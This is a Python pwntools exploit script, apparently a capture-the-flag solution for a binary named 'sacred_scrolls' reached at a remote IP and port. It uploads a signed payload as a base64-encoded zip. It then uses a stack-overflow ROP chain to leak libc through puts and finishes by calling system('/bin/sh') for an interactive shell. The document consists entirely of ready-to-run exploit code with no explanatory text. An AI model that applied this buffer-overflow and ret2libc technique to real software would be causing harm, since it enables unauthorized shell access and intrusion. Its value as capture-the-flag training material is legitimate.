from pwn import *
import zipfile
import base64

context.log_level = "debug"
context.arch = "amd64"
# context.terminal = ["tmux", "splitw", "-h", "-F" "#{pane_pid}", "-P"]
# p = process("./sacred_scrolls")
p = remote("206.189.116.117", 30602)

ru = lambda a: p.readuntil(a)
r = lambda n: p.read(n)
sla = lambda a, b: p.sendlineafter(a, b)
sa = lambda a, b: p.sendafter(a, b)
sl = lambda a: p.sendline(a)
s = lambda a: p.send(a)

# gdb.attach(p)
def setup(p):
    sla("tag: ", payload)
    # payload upload
    p.recvuntil(">> ")
    p.sendline("1")
    # payload encoding
    with open("spell.txt", "wb") as spell:  # write signature + payload to spell.txt
        spell.write(payload)
    with zipfile.ZipFile("spell.zip", mode="w") as archive:  # zip spell
        archive.write("spell.txt")
    with open("spell.zip", "rb") as zip_file:
        encoded = base64.b64encode(zip_file.read())
    # payload send
    sla(": ", encoded)
    # bypass signature check
    sla(">> ", "2")
    # sla("ename:", "y")  # <- this for local (replacing spell.txt)
    # gdb.attach(p)
    # call ROP to leak LIBC
    sla(">> ", "3")


sig1 = p32(0x93919FF0)
sig2 = p32(0xA19AE2)
payload = sig1 + sig2

elf = ELF("./sacred_scrolls")
libc = ELF("./glibc/libc.so.6")
offset = 32
pop_rdi = 0x00000000004011B3
ret = 0x00000000004007CE
main = 0x400EE2
payload += (
    b"A" * offset
    + p64(pop_rdi)
    + p64(elf.got["puts"])
    + p64(elf.plt["puts"])
    + p64(main)
)
setup(p)
# leak
p.recvuntil("saved!\n")
leak = u64(p.recv(6).ljust(8, b"\x00"))
libc.address = leak - libc.symbols["puts"]
info(str(hex(libc.address)))

### Stage 2: call system("/bin/sh") using leaked libc
payload = sig1 + sig2
payload += (
    b"A" * offset
    + p64(ret)
    + p64(pop_rdi)
    + p64(next(libc.search(b"/bin/sh\x00")))
    + p64(elf.symbols["system"])
)
setup(p)
p.interactive()
